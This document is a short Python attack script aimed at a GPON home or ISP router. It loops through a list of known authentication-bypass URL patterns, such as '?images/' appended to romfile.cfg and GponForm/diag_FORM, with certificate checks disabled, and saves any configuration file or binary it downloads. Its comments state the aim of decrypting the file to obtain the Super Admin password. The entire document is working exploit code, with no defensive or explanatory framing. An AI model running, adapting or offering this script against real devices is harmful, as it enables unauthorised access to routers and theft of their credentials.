import requests
import os
from dotenv import load_dotenv
import urllib3

urllib3.disable_warnings()
load_dotenv()
IP = os.getenv("ROUTER_IP").strip()

# Common GPON Auth Bypass techniques (?images/, ?images, /script/)
urls_to_try = [
    f"{IP}/romfile.cfg?images/",
    f"{IP}/romfile.cfg?images",
    f"{IP}/GponForm/diag_FORM?images/",
    f"{IP}/cgi-bin/config.cfg?images/",
    f"{IP}/backup.cfg?images/",
    f"{IP}/cgi-bin/backup.cgi?images/",
    f"{IP}/backup/romfile.cfg?images/",
    f"{IP}/cgi-bin/romfile.cfg?images/",
    f"{IP}/romfile.cfg", # Sometimes just works if session cookie is cached
    f"{IP}/GponForm/diag_Form",
]

print(f"[*] Attempting GPON Auth Bypass & Config Download on {IP}...")
for url in urls_to_try:
    try:
        print(f"[*] Trying: {url}")
        r = requests.get(url, timeout=10, verify=False)
        if r.status_code == 200:
            # Check if it's actual config data (XML) and not just an HTML error page
            content_type = r.headers.get("Content-Type", "")
            if "xml" in content_type or ("html" not in content_type and len(r.content) > 5000 and "<?xml" in r.text[:200]):
                print(f"[!] BINGO! Config file downloaded from {url}")
                filename = f"bypass_config_{url.split('/')[-1].replace('?', '_').replace('/', '_')}.cfg"
                with open(filename, "wb") as f:
                    f.write(r.content)
                print(f"    -> Saved to {filename} ({len(r.content)} bytes)")
                print("    -> Now we can decrypt this file to get the Super Admin password!")
            elif "html" not in content_type and len(r.content) > 5000:
                print(f"[?] Suspicious binary downloaded from {url} ({len(r.content)} bytes)")
                filename = f"bypass_blob_{url.split('/')[-1].replace('?', '_').replace('/', '_')}.bin"
                with open(filename, "wb") as f:
                    f.write(r.content)
    except Exception as e:
        pass

print("[*] Done checking bypasses.")
